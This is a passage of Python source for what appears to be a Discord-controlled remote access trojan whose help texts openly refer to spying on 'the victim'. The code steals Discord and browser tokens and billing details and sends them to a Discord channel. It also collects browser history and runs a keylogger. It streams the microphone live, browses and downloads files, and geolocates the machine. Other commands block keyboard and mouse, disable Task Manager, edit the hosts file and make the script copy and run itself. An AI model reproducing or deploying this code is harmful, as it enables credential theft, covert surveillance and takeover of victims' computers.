        embed.set_footer(text=f"Page {self.current_page + 1} of {len(self.tasks) // self.tasks_per_page + 1}")
        return embed

    async def update_task_embed(self, message):
        embed = await self.send_task_embed()
        await message.edit(embed=embed, view=self)

    async def end_task(self, pid):
        try:
            task = psutil.Process(pid)
            task.terminate()
            await self.ctx.send(f":white_check_mark: Task '{task.name()}' (PID: {pid}) has been terminated.")
        except psutil.NoSuchProcess:
            await self.ctx.send(f":x: Task with PID {pid} no longer exists.")
        except Exception as e:
            await self.ctx.send(f"Error terminating task with PID {pid}: {e}")

    async def prompt_end_task(self, message):
        prompt_message = await self.ctx.send("Enter the PID of the task to end:")

        def check(m):
            return m.author == self.ctx.author and m.channel == self.ctx.channel and m.content.isdigit()

        try:
            task_message = await self.ctx.bot.wait_for("message", timeout=30.0, check=check)
            pid = int(task_message.content)

            if not any(task.info['pid'] == pid for task in self.tasks):
                await self.ctx.send(":x: Invalid PID.")
                await task_message.delete()
                await prompt_message.delete()
                return

            await self.end_task(pid)
            await task_message.delete()
            await prompt_message.delete()
            await self.update_task_embed(message)

        except asyncio.TimeoutError:
            await self.ctx.send(":x: You took too long to respond. Please try again.")
            await prompt_message.delete()

        except (IndexError, ValueError):
            await self.ctx.send(":x: Invalid PID. Please try again.")
            await prompt_message.delete()
        except Exception as e:
            await self.ctx.send(f"Error: {e}")
            await prompt_message.delete()

    async def task_manager_end(self, message):
        await message.edit(content=":white_check_mark: Task manager session ended.", view=None)

    @discord.ui.button(label="◀️ Previous", style=discord.ButtonStyle.primary)
    async def previous_page(self, interaction: discord.Interaction, button: Button):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this task manager session.", ephemeral=True)
            return
        if self.current_page > 0:
            self.current_page -= 1
            await self.update_task_embed(interaction.message)
        await interaction.response.defer()

    @discord.ui.button(label="▶️ Next", style=discord.ButtonStyle.primary)
    async def next_page(self, interaction: discord.Interaction, button: Button):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this task manager session.", ephemeral=True)
            return
        if (self.current_page + 1) * self.tasks_per_page < len(self.tasks):
            self.current_page += 1
            await self.update_task_embed(interaction.message)
        await interaction.response.defer()

    @discord.ui.button(label="📄 Task Details", style=discord.ButtonStyle.secondary)
    async def task_details(self, interaction: discord.Interaction, button: Button):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this task manager session.", ephemeral=True)
            return
        await self.update_task_embed(interaction.message)
        await interaction.response.defer()

    @discord.ui.button(label="🛑 End Task", style=discord.ButtonStyle.danger)
    async def end_task_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this task manager session.", ephemeral=True)
            return
        await self.prompt_end_task(interaction.message)
        await interaction.response.defer()

    @discord.ui.button(label="❌ End Session", style=discord.ButtonStyle.danger)
    async def end_session_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this task manager session.", ephemeral=True)
            return
        await self.task_manager_end(interaction.message)
        await interaction.response.defer()

    @discord.ui.button(label="🔢 Go to Page", style=discord.ButtonStyle.secondary)
    async def goto_page_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this task manager session.", ephemeral=True)
            return
        
        await interaction.response.send_message("Enter the page number:", ephemeral=True)
        def check(m):
            return m.author == self.ctx.author and m.channel == self.ctx.channel and m.content.isdigit()
        
        try:
            page_message = await self.ctx.bot.wait_for("message", timeout=30.0, check=check)
            page_number = int(page_message.content) - 1
            
            max_page = (len(self.tasks) - 1) // self.tasks_per_page
            if page_number < 0 or page_number > max_page:
                await self.ctx.send(":x: Invalid page number.")
                await page_message.delete()
                return

            self.current_page = page_number
            await self.update_task_embed(interaction.message)
            await page_message.delete()
        except Exception as e:
            await self.ctx.send(f"Error: {e}")
            await page_message.delete()

class FileExplorerView(View):
    def __init__(self, ctx, message):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.message = message

    async def handle_interaction(self, interaction, action):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(":x: You cannot control this file explorer session.", ephemeral=True)
            return

        await interaction.response.defer()

        if action == "previous_page":
            await changePage(self.ctx, self.message, -1)
        elif action == "next_page":
            await changePage(self.ctx, self.message, 1)
        elif action == "go_up":
            await back(self.ctx, self.message)
        elif action == "view_file":
            await viewFile(self.ctx, self.message)
        elif action == "enter_folder":
            await enterFolder(self.ctx, self.message)
        elif action == "refresh":
            await fileExplorer(self.ctx, self.message)
        elif action == "end_session":
            await endfileexplorersession(self.ctx, self.message)
            self.stop()

    @discord.ui.button(label="◀️ Previous", style=discord.ButtonStyle.primary)
    async def previous_page(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "previous_page")

    @discord.ui.button(label="▶️ Next", style=discord.ButtonStyle.primary)
    async def next_page(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "next_page")

    @discord.ui.button(label="🔼 Go Up", style=discord.ButtonStyle.secondary)
    async def back(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "go_up")

    @discord.ui.button(label="📄 View File", style=discord.ButtonStyle.secondary)
    async def view(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "view_file")

    @discord.ui.button(label="📂 Enter Folder", style=discord.ButtonStyle.secondary)
    async def folder(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "enter_folder")

    @discord.ui.button(label="🔄 Refresh", style=discord.ButtonStyle.success)
    async def refresh(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "refresh")

    @discord.ui.button(label="❌ End Session", style=discord.ButtonStyle.danger)
    async def end_session(self, interaction: discord.Interaction, button: Button):
        await self.handle_interaction(interaction, "end_session")

def get_tokens():
    cleaned = []
    tokens = []
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    paths = {
        'Discord': os.path.join(roaming, 'discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Google Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
        'Chrome Accounts': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
        'Microsoft Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Chromium': os.path.join(local, 'Chromium', 'User Data'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Firefox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
    }

    def process_discord_tokens(path, source):
        nonlocal tokens
        local_state_path = os.path.join(path, "Local State")
        if os.path.exists(local_state_path):
            master_key = get_master_key(local_state_path)
            if master_key is None:
                return

            for file_name in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
                if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                    continue

                for line in open(os.path.join(path, "Local Storage", "leveldb", file_name), errors='ignore'):
                    line = line.strip()
                    found_tokens = re.findall(r"dQw4w9WgXcQ:[^\"]*", line)
                    for token in found_tokens:
                        encrypted_token = token.split(":")[1]
                        encrypted_token_bytes = base64.b64decode(encrypted_token)
                        decrypted_token = decrypt_val(encrypted_token_bytes, master_key)
                        if "Failed to decrypt" not in decrypted_token:
                            tokens.append(decrypted_token)
                            check_token(decrypted_token, source)

    def process_browser_tokens(path, source, profiles):
        nonlocal tokens
        for profile in profiles:
            new_path = path + f'\\{profile}\\Local Storage\\leveldb\\'
            if not os.path.exists(new_path):
                continue
            for file_name in os.listdir(new_path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in open(os.path.join(new_path, file_name), errors='ignore'):
                    line = line.strip()
                    found_tokens = re.findall(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}", line)
                    for token in found_tokens:
                        check_token(token, f'{source} ({profile})')

    def process_firefox_tokens():
        nonlocal tokens
        if os.path.exists(os.path.join(roaming, "Mozilla", "Firefox", "Profiles")):
            for path, _, files in os.walk(os.path.join(roaming, "Mozilla", "Firefox", "Profiles")):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in open(os.path.join(path, _file), errors='ignore'):
                        line = line.strip()
                        found_tokens = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line)
                        for token in found_tokens:
                            check_token(token, 'Firefox')

    threads = []

    for source, path in paths.items():
        if not os.path.exists(path):
            print(f"Path not found for {source}: {path}")
            continue

        if "discord" in path:
            thread = threading.Thread(target=process_discord_tokens, args=(path, source))
            threads.append(thread)
            thread.start()
        else:
            profiles = ['Default']
            for dir in os.listdir(path):
                if dir.startswith('Profile '):
                    profiles.append(dir)
            thread = threading.Thread(target=process_browser_tokens, args=(path, source, profiles))
            threads.append(thread)
            thread.start()

    thread = threading.Thread(target=process_firefox_tokens)
    threads.append(thread)
    thread.start()

    for thread in threads:
        thread.join()

    cleaned = list(set(tokens))
    return cleaned

def get_browser_history():
    browser_paths = {
        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\History"),
        "Firefox": os.path.join(os.environ['APPDATA'], r"Mozilla\Firefox\Profiles"),
        "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data\Default\History")
    }
    
    history_data = {}

    chrome_path = browser_paths["Chrome"]
    if os.path.exists(chrome_path):
        shutil.copy2(chrome_path, "Chrome_History.db")
        connection = sqlite3.connect("Chrome_History.db")
        cursor = connection.cursor()
        history_data["Chrome"] = []
        
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for row in cursor.fetchall():
            history_data["Chrome"].append({
                "url": row[0],
                "title": row[1],
                "last_visit_time": row[2]
            })
        
        cursor.close()
        connection.close()
        os.remove("Chrome_History.db")

    firefox_profile_dir = browser_paths["Firefox"]
    if os.path.exists(firefox_profile_dir):
        profile_path = max([os.path.join(firefox_profile_dir, d) for d in os.listdir(firefox_profile_dir) if d.endswith(".default")], key=os.path.getmtime)
        history_file = os.path.join(profile_path, "places.sqlite")

        if os.path.exists(history_file):
            shutil.copy2(history_file, "Firefox_History.db")
            connection = sqlite3.connect("Firefox_History.db")
            cursor = connection.cursor()
            history_data["Firefox"] = []
            
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
            for row in cursor.fetchall():
                history_data["Firefox"].append({
                    "url": row[0],
                    "title": row[1],
                    "last_visit_date": row[2]
                })

            cursor.close()
            connection.close()
            os.remove("Firefox_History.db")

    edge_path = browser_paths["Edge"]
    if os.path.exists(edge_path):
        shutil.copy2(edge_path, "Edge_History.db")
        connection = sqlite3.connect("Edge_History.db")
        cursor = connection.cursor()
        history_data["Edge"] = []
        
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for row in cursor.fetchall():
            history_data["Edge"].append({
                "url": row[0],
                "title": row[1],
                "last_visit_time": row[2]
            })
        
        cursor.close()
        connection.close()
        os.remove("Edge_History.db")

    return history_data

class DownloadView(View):
    def __init__(self, ctx, selected_file):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.selected_file = selected_file

    @discord.ui.button(label="⬇️ Download", style=discord.ButtonStyle.primary)
    async def download_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user == self.ctx.author:
            await interaction.response.defer()
            await download(self.ctx, name=self.selected_file)
            self.stop()
        else:
            await interaction.response.send_message(":x: You cannot use this button.", ephemeral=True)

def fetch_user_data(token: str):
    headers = {
        "Authorization": token
    }
    
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
    additional_info = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    
    if response.status_code == 200:
        user_data = response.json()
        user_info = {
            "username": user_data["username"],
            "2fa": additional_info["mfa_enabled"],
            "id": user_data["id"],
            "avatar": user_data["avatar"],
            "has_nitro": user_data.get("premium_type", 0) > 0
        }
        return user_info
    else:
        return None
    
async def fileExplorer(ctx, message=None):
    global current_directory, current_page
    try:
        items = os.listdir(current_directory)
        items_per_page = 25
        total_pages = (len(items) - 1) // items_per_page + 1
        start_index = current_page * items_per_page
        end_index = start_index + items_per_page

        embed = discord.Embed(title=f"📂 Contents of {current_directory}", color=0x3498db)
        embed.set_footer(text=f"Page {current_page + 1} of {total_pages} | Use ◀️ ▶️ to navigate pages, 🔼 to go up, 📂 to enter folder, 📄 to view file, 🔄 to refresh")

        for index, item in enumerate(items[start_index:end_index], start=start_index):
            if os.path.isdir(os.path.join(current_directory, item)):
                embed.add_field(name=f"{index} 📁 {item}", value="Folder", inline=False)
            else:
                embed.add_field(name=f"{index} 📄 {item}", value="File", inline=False)

        if message:
            await message.edit(embed=embed)
        else:
            message = await ctx.send(embed=embed)
        return message
    except Exception as e:
        await ctx.send(f"Error listing files: {e}")

async def changePage(ctx, message, direction):
    global current_page
    items = os.listdir(current_directory)
    items_per_page = 25
    total_pages = (len(items) - 1) // items_per_page + 1

    current_page += direction
    if current_page < 0:
        current_page = total_pages - 1
    elif current_page >= total_pages:
        current_page = 0

    await fileExplorer(ctx, message)

async def back(ctx, message):
    global current_directory, current_page
    current_directory = os.path.dirname(current_directory)
    current_page = 0
    directory_history = [current_directory]
    await fileExplorer(ctx, message)

async def viewFile(ctx, message):
    global current_directory
    ask_message = await ctx.send("Enter the file index to view details:")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit()

    try:
        file_message = await bot.wait_for("message", timeout=30.0, check=check)
        index = int(file_message.content)

        items = os.listdir(current_directory)
        selected_file = items[index]
        file_path = os.path.join(current_directory, selected_file)

        if os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
            creation_time = datetime.fromtimestamp(os.path.getctime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
            embed = discord.Embed(title=f"📄 File Details: {selected_file}", color=0xe67e22)
            embed.add_field(name="File Size", value=f"{file_size} bytes", inline=False)
            embed.add_field(name="Creation Date", value=creation_time, inline=False)
            embed.add_field(name="Path", value=file_path, inline=False)
            
            download_view = DownloadView(ctx, selected_file)
            await ctx.send(embed=embed, view=download_view)

        else:
            await ctx.send("The selected item is not a file.")

        await file_message.delete()
        await ask_message.delete()
    except (IndexError, ValueError):
        await file_message.delete()
        await ask_message.delete()
    except Exception as e:
        await ctx.send(f"Error: {e}")
        await file_message.delete()
        await ask_message.delete()

async def enterFolder(ctx, message):
    global current_directory, current_page, directory_history
    ask_message = await ctx.send("Enter the folder index to navigate into:")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit()

    try:
        folder_message = await bot.wait_for("message", timeout=30.0, check=check)
        index = int(folder_message.content)

        items = os.listdir(current_directory)
        selected_folder = items[index]
        folder_path = os.path.join(current_directory, selected_folder)

        if os.path.isdir(folder_path):
            directory_history.append(current_directory)
            current_directory = folder_path
            current_page = 0
            await fileExplorer(ctx, message)
        else:
            await ctx.send("The selected item is not a folder.")

        await folder_message.delete()
        await ask_message.delete()
    except (IndexError, ValueError):
        await folder_message.delete()
        await ask_message.delete()
    except Exception as e:
        await ctx.send(f"Error: {e}")
        await folder_message.delete()
        await ask_message.delete()

async def endfileexplorersession(ctx, message):
    await message.delete()
    await ctx.send("File Explorer session has ended.")

def flush_dns():
    subprocess.run("ipconfig /flushdns", shell=True)

def block_mouse():
    global isBlocking
    isBlocking = True
    hook = ctypes.windll.user32.SetWindowsHookExA(
        WH_MOUSE_LL,
        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(low_level_mouse_proc),
        ctypes.windll.kernel32.GetModuleHandleW(None),
        0
    )
    while isBlocking:
        ctypes.windll.user32.GetMessageW(None, 0, 0, 0)
    ctypes.windll.user32.UnhookWindowsHookEx(hook)

@bot.before_invoke
async def single_instance_check(ctx):
    lock_file = os.path.join(lock_dir, f"{ctx.command.name}.lock")
    if os.path.exists(lock_file):
        # await ctx.send(f"The `{ctx.command.name}` command is already running in another instance.")
        raise Exception(f"the command {ctx.command.name} is locked")
    with open(lock_file, "w") as f:
        f.write("locked")

@bot.after_invoke
async def single_instance_cleanup(ctx):
    lock_file = os.path.join(lock_dir, f"{ctx.command.name}.lock")
    if os.path.exists(lock_file):
        os.remove(lock_file)

@bot.command(help="Spy on the victim's files with this command, you can navigate through everywhere, even folders!")
async def fileexplorer(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        global current_page, directory_history
        current_page = 0
        directory_history = [current_directory]
        message = await fileExplorer(ctx)

        view = FileExplorerView(ctx, message)
        await message.edit(view=view)
    else:
        return
    
@bot.command(help="intensely moves the mouse around")
async def movemouse(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        duration = 10
        start_time = time.time()
        screen_width, screen_height = pyautogui.size()

        while time.time() - start_time < duration:
            pyautogui.moveTo(random.randint(0, screen_width), random.randint(0, screen_height), duration=0.01)

        await ctx.send(":white_check_mark: Mouse movement completed!")
    else:
        await ctx.send(":x: Error, PC is either off or script is NOT running.")

@bot.command(name='blockwebsite', help="Blocks a website")
async def block_website(ctx, website: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if not IsAdmin():
            await ctx.send(":x: Permission denied. Please run the script as an administrator.")
            return
        
        try:
            if not website.startswith("www.") and not website.startswith("http"):
                website = f"www.{website}"
            domain = website.split("://")[-1]

            with open(HOSTS_PATH, 'r+') as hosts_file:
                hosts_content = hosts_file.readlines()
                if any(domain in line for line in hosts_content):
                    await ctx.send(f":x: The website `{domain}` is already blocked.")
                    return
                
                hosts_file.write(f"{REDIRECT_IP} {domain}\n")
                flush_dns()
                await ctx.send(f":white_check_mark: The website `{domain}` has been blocked.")
        except Exception as e:
            await ctx.send(f":x: An error occurred: `{str(e)}`")
    else:
        return

@bot.command(name='unblockwebsite', help="unblocks a website")
async def unblock_website(ctx, website: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if not IsAdmin():
            await ctx.send(":x: Permission denied. Please run the script as an administrator.")
            return

        try:
            if not website.startswith("www.") and not website.startswith("http"):
                website = f"www.{website}"
            domain = website.split("://")[-1]

            with open(HOSTS_PATH, 'r+') as hosts_file:
                hosts_content = hosts_file.readlines()
                hosts_file.seek(0)
                for line in hosts_content:
                    if domain not in line:
                        hosts_file.write(line)
                hosts_file.truncate()

            flush_dns()
            await ctx.send(f":white_check_mark: The website `{domain}` has been unblocked.")
        except Exception as e:
            await ctx.send(f":x: An error occurred: `{str(e)}`")
    else:
        return

@bot.command(help="Inputs, a type of some sort. There are 2 types of inputs and action. type 'block' blocks the type of input stated. 'unblock' on the other hand unblocks inputs, inputs: 'keyboard', and 'mouse' \n Usage: '!inputs block mouse'")
async def inputs(ctx, type: str, what: str):
    global isKeyboardBlocked
    global isMouseBlocked
    global keyboardListener
    global mouseListener

    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            if type == "keyboard":
                if what == "block":
                    if not isKeyboardBlocked:
                        keyboardListener = kb.Listener(suppress=True)
                        keyboardListener.start()
                        isKeyboardBlocked = True
                        await ctx.send(":white_check_mark: Keyboard blocked!")
                    else:
                        await ctx.send(":x: Keyboard already blocked!")
                elif what == "unblock":
                    if isKeyboardBlocked:
                        keyboardListener.stop()
                        isKeyboardBlocked = False
                        keyboardListener = None
                        await ctx.send(":white_check_mark: Keyboard unblocked!")
                    else:
                        await ctx.send(":x: Keyboard already unblocked!")
                else:
                    await ctx.send(":x: Invalid arguments for keyboard!")
            
            elif type == "mouse":
                if what == "block":
                    if not isMouseBlocked:
                        mouseListener = ms.Listener(suppress=True)
                        mouseListener.start()
                        isMouseBlocked = True
                        await ctx.send(":white_check_mark: Mouse blocked!")
                    else:
                        await ctx.send(":x: Mouse already blocked!")
                elif what == "unblock":
                    if isMouseBlocked:
                        mouseListener.stop()
                        isMouseBlocked = False
                        mouseListener = None
                        await ctx.send(":white_check_mark: Mouse unblocked!")
                    else:
                        await ctx.send(":x: Mouse already unblocked!")
                else:
                    await ctx.send(":x: Invalid arguments for mouse!")
            else:
                await ctx.send(":x: Invalid type! Use 'keyboard' or 'mouse'.")
        
        except Exception as e:
            await ctx.send(f":x: Error: {e}")
    else:
        return

@bot.command(help="Spies on the victim's microphone's live feed")
async def livemic(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        vc_channel = discord.utils.get(ctx.guild.voice_channels, name="mic and webcam", category=ctx.channel.category)
        vc = await vc_channel.connect(self_deaf=True)

        vc.play(PyAudioPCM())
        await ctx.send(f":white_check_mark: `Joined {vc_channel} and streaming microphone in real-time`")
    else:
        return

@bot.command(help="sends a message through message box.")
async def message(ctx, *, msg: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        def mesagetrigger():
            ctypes.windll.user32.MessageBoxW(0, msg, "INFORMATION", 0x40 | 0x0)

        threading.Thread(target=mesagetrigger).start()
    else:
        return

@bot.command(help="stops spying on the victim's microphone's live feed.")
async def stoplive(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        voice_client = ctx.guild.voice_client
    
        if voice_client and voice_client.is_connected():
            await voice_client.disconnect()
            await ctx.send(f"`:white_check_mark: Disconnected from voice channel and stopped microphone streaming.`")
        else:
            await ctx.send(":x: Bot is not currently connected to a voice channel.")
    else:
        return

@bot.command(help="geolocates the victim's location (not accurate)")
async def locate(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
            await ctx.send(f":white_check_mark: {link} (might be inaccurate)")
    else:
        return

@bot.command(help="Disables mouse")
async def disablemouse(ctx):
    global isBlocking
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if not isBlocking:
            threading.Thread(target=block_mouse, daemon=True).start()
            await ctx.send(":no_entry: Mouse has been blocked!")
        else:
            await ctx.send(":x: Mouse is already blocked.")
    else:
        return
    
@bot.command(help="Enables the mouse")
async def enablemouse(ctx):
    global isBlocking
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if isBlocking:
            isBlocking = False
            await ctx.send(":white_check_mark: Mouse has been unblocked!")
        else:
            await ctx.send(":x: Mouse is not blocked.")
    else:
        return
    
@bot.command(help="Blocks inputs from the keyboard")
async def disablekeyboard(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                await ctx.send(":x: This command requires administrator privileges!")
                return
            block_keyboard(False)
            await ctx.send(":no_entry_sign: Keyboard has been disabled!")
        except Exception as e:
            await ctx.send(f":x: Failed to disable keyboard: `{str(e)}`")
    else:
        return

@bot.command(help="Unblocks inputs from the keyboard")
async def enablekeyboard(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                await ctx.send(":x: This command requires administrator privileges!")
                return
            block_keyboard(True)
            await ctx.send(":white_check_mark: Keyboard has been enabled!")
        except Exception as e:
            await ctx.send(f":x: Failed to enable keyboard: `{str(e)}`")
    else:
        return

@bot.command(help="Grabs all tokens from Browsers and Discord.")
async def grabtokens(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        tokens = get_tokens()

        embed = Embed(title=":white_check_mark: Fetched Discord Tokens", color=Colour.blue())

        if not tokens:
            await ctx.send(":x: No tokens found.")
            return

        for token_info in tokens:
            user_info = fetch_user_data(token_info)
            billing_info = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_info}).json()
            if user_info:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png" if user_info['avatar'] else None
                embed.add_field(name="Username", value=user_info["username"], inline=True)
                embed.add_field(name="User ID", value=user_info["id"], inline=True)
                embed.add_field(name="2FA ", value=":white_check_mark:" if user_info["2fa"] else ":x:", inline=True)
                embed.add_field(name="Has Nitro", value=":white_check_mark:" if user_info["has_nitro"] else ":x:", inline=True)

                if avatar_url:
                    embed.set_thumbnail(url=avatar_url)
                if billing_info:
                    embed.add_field(name="Billings", value=f"```{billing_info}```")
            embed.add_field(name="Token", value=f"```{token_info}```", inline=False)

        await ctx.send(embed=embed)

    else:
        return

@bot.command(help="disables the task manager. (requires Admin)")
async def disabletaskmanager(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
            
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output

            shel = threading.Thread(target=shell)
            shel.start()
            shel.join()

            result = str(shell().stdout.decode('CP437'))
            if len(result) <= 5:
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                os.system('powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
            else:
                os.system('powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')

            await ctx.send("✅ Success")
        else:
            await ctx.send("❌ The code needs Admin for this to work.")
    else:
        return

@bot.command(help="enables the task manager. (requires Admin)")
async def enabletaskmanager(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                    def shell():
                        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        return output
                    shel = threading.Thread(target=shell)
                    shel._running = True
                    shel.start()
                    time.sleep(1)
                    shel._running = False
                    result = str(shell().stdout.decode('CP437'))
                    if len(result) <= 5:
                        await ctx.send("✅ Please wait")  
                    else:
                        reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                        await ctx.send("✅ Please wait")
            else:
                await ctx.send("❌ This command requires Admin for the Code.")
    else:
        return

@bot.command(help="Displays files from the current directory")
async def displayfilesdir(ctx):
    global current_directory
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        async def get_directory_structure(path, indent=""):
            structure = ""
            try:
                items = await asyncio.to_thread(os.listdir, path)
                items.sort()
                for item in items:
                    full_path = os.path.join(path, item)
                    if os.path.isdir(full_path):
                        structure += f"{indent}📂 {item}/\n"
                        structure += await get_directory_structure(full_path, indent + "    ")
                    else:
                        structure += f"{indent}📄 {item}\n"
            except PermissionError:
                structure += f"{indent}⛔ Permission Denied\n"
            return structure

        directory_tree = await get_directory_structure(current_directory)

        if len(directory_tree) > 2000:
            with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", newline="", dir=os.getenv('TEMP')) as temp_file:
                temp_file.write(directory_tree)
                temp_file_path = temp_file.name

            file = discord.File(temp_file_path, filename="directory_structure.txt")
            await ctx.send(f":warning: Directory tree is too large to display in a single message. Sending it as a text file:", file=file)

            os.remove(temp_file_path)
        else:
            embed = discord.Embed(title="Directory Structure", description=f"Displaying files from: {current_directory}", color=discord.Color.green())
            embed.add_field(name="Files and Folders", value=f"```txt\n{directory_tree or 'No files or folders found.'}\n```", inline=False)
            await ctx.send(embed=embed)
    else:
        return
        
@bot.command(help="Starts keylogger.")
async def startlogging(ctx):
    global logging_active, log_channel

    if ctx.channel.category and ctx.channel.category.name.startswith("PC") and ctx.channel.name == "commands":
        if logging_active:
            await ctx.send("🟢 Logging is already active.")
            return

        category = ctx.channel.category
        log_channel = await category.create_text_channel("keylogging")

        logging_active = True
        threading.Thread(target=log_keys, daemon=True).start()
        await ctx.send(":white_check_mark: Keylogging started. Keys will be logged in the 'keylogging' channel.")
    else:
        return

@bot.command(help="Self-replicates like a cell.")
async def replicate(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        current_file = os.path.abspath(__file__)
        base_name = os.path.basename(current_file)
        script_name, extension = os.path.splitext(base_name)
        counter = 1
        
        while True:
            new_file_name = f"{script_name}_copy{counter}{extension}"
            if not os.path.exists(new_file_name):
                break
            counter += 1
        
        shutil.copy(current_file, new_file_name)
        print(f":white_check_mark: Created a new copy: {new_file_name}")
        
        subprocess.Popen(["python", new_file_name])
        print(f":white_check_mark: Executed the new copy: {new_file_name}")
    else:
        return

@bot.command(help="Stops keylogger.")
